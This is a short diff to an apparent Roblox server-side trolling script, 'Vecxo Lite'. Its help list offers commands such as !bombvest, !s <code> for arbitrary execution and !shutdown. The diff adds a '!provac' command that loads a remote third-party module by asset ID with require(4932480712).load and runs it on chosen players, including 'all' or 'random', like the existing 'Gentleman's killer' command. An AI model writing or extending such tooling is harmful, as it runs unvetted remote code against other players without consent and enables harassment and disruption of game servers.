@@ -420,20 +420,21 @@ local function showCommandGui(player)
 		"15 - !bombvest <plr|all|others|random|friends>",
 		"16 - !toolgun <plr|all|others|random|friends>",
 		"17 - !gentk <plr|all|others|random|friends>",
-		"18 - !dex <plr|all|others|random|friends>",
-		"19 - !s <code>",
-		"20 - !clr - Cleans the server of junk",
-		"21 - !shutdown - Shuts the server down",
-		"22 - !wls - View whitelisted users in current server",
-		"23 - !bans - View banned players from the current server",
-		"24 - !backupmap - Backups the current map parts and stores them for later use",
-		"25 - !restoremap - Generates what was stored into !backupmap",
-		"26 - !hideobby - Hides the obby",
-		"27 - !unhideobby - Unhides the obby",
-		"28 - !unload - Unloads Vecxo Lite",
-		"29 - !reloadscript - Unloads and Reloads Vecxo Lite",
-		"30 - !gobby - Generates cool obby",
-		"31 - !serverprotection - <true/false>"
+		"18 - !provac <plr|all|others|random|friends>",
+		"19 - !dex <plr|all|others|random|friends>",
+		"20 - !s <code>",
+		"21 - !clr - Cleans the server of junk",
+		"22 - !shutdown - Shuts the server down",
+		"23 - !wls - View whitelisted users in current server",
+		"24 - !bans - View banned players from the current server",
+		"25 - !backupmap - Backups the current map parts and stores them for later use",
+		"26 - !restoremap - Generates what was stored into !backupmap",
+		"27 - !hideobby - Hides the obby",
+		"28 - !unhideobby - Unhides the obby",
+		"29 - !unload - Unloads Vecxo Lite",
+		"30 - !reloadscript - Unloads and Reloads Vecxo Lite",
+		"31 - !gobby - Generates cool obby",
+		"32 - !serverprotection - <true/false>"
 		--"28 - !restart - Attempts to restart the server"
 
 	}
@@ -1364,6 +1365,12 @@ local function processCommand(sender, msg)
 		for i, plr in ipairs(targets) do
 			require(5430831931).Dark(plr.Name)
 			notifyv2(sender, "[Vecko Lite]: ", "✅ Gentleman's killer ran on " ..plr.Name.." successfully")
+		end
+	elseif cmd == "!provac" then
+		local targets = GetPlayers(args[2], sender)
+		for i, plr in ipairs(targets) do
+			require(4932480712).load(plr.Name)
+			notifyv2(sender, "[Vecko Lite]: ", "✅ Pro vacuum ran on " ..plr.Name.." successfully")
 		end
 	elseif cmd == "!hang" then
 		local targets = GetPlayers(args[2], sender)
